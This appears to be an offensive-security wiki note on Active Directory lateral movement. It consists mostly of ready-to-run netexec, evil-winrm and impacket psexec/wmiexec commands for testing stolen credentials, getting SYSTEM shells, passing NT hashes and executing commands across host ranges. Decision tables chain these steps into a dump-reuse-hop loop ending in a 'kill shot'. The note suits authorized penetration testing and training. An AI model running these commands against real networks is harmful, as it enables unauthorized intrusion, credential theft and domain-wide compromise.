# 🏰 AD Lateral Movement

> With a credential or NT hash, hop between hosts and get shells: `psexec`/`wmiexec` for SYSTEM where you're admin, `evil-winrm` for interactive PowerShell, and pass-the-hash everywhere. `(Pwn3d!)` in netexec = you're local admin there.

Part of [[Active Directory]]. Related: [[Credential Reuse]] · [[Pass-the-Hash]] · [[WinRM]] · [[SMB]] · [[Dumping Windows Hashes]]

---

## 🧠 THINK
- **Test the cred on every host** in the domain/subnet — AD creds are reused constantly ([[Credential Reuse]]).
- `netexec smb ... ` shows **`(Pwn3d!)`** = local admin → `psexec`/`wmiexec` → SYSTEM.
- Not admin but WinRM-allowed → `evil-winrm` shell.
- Have only the **NT hash**? → pass-the-hash, no plaintext needed ([[Pass-the-Hash]]).

## ⚡ CHECK ACCESS
```bash
netexec smb $IP -u $U -p $P                 # (Pwn3d!)=admin  ·  + =valid
```
```bash
netexec winrm $IP -u $U -p $P               # (Pwn3d!)=can WinRM
```

## 💥 GET A SHELL
Interactive PowerShell (WinRM):
```bash
evil-winrm -i $IP -u $U -p $P
```
SYSTEM via psexec/wmiexec (need local admin):
```bash
impacket-psexec $DOMAIN/$U:$P@$IP
```
```bash
impacket-wmiexec $DOMAIN/$U:$P@$IP
```
With a hash instead of a password:
```bash
impacket-psexec $DOMAIN/$U@$IP -hashes :<NThash>
```
```bash
evil-winrm -i $IP -u $U -H <NThash>
```
Run a command across many hosts:
```bash
netexec smb <range> -u $U -p $P -x "whoami"
```

## 🧹 AFTER LANDING
- SYSTEM/admin → **dump hashes** ([[Dumping Windows Hashes]]) → new creds → repeat.
- Low-priv → local privesc ([[Windows Privilege Escalation]]) → then dump.
- Feed everything into [[BloodHound]] (mark owned) + [[Credential Reuse]].

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `(Pwn3d!)` SMB | psexec/wmiexec → SYSTEM → dump |
| `(Pwn3d!)` WinRM | evil-winrm shell |
| Valid, not admin | evil-winrm (if allowed) / local privesc / reuse elsewhere |
| Only NT hash | [[Pass-the-Hash]] |
| SYSTEM on a host | [[Dumping Windows Hashes]] → new creds → hop again |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Cred valid, no shell method | user isn't admin/WinRM — reuse on other hosts; local privesc first |
| psexec fails | try wmiexec/smbexec/atexec; check admin + share access |
| Auth rejected | format/local-vs-domain/skew → [[Credentials Rejected]] |
| No lateral targets | re-run [[BloodHound]]; sweep subnet ([[Host Discovery]]) |

## 📇 CHEAT SHEET
```bash
netexec smb $IP -u $U -p $P            # (Pwn3d!)?
```
```bash
impacket-psexec $DOMAIN/$U:$P@$IP      # SYSTEM
```
```bash
evil-winrm -i $IP -u $U -p $P          # or -H <hash>
```
**Kill shot:** cred/hash → `(Pwn3d!)` → psexec SYSTEM → dump → reuse → next host.
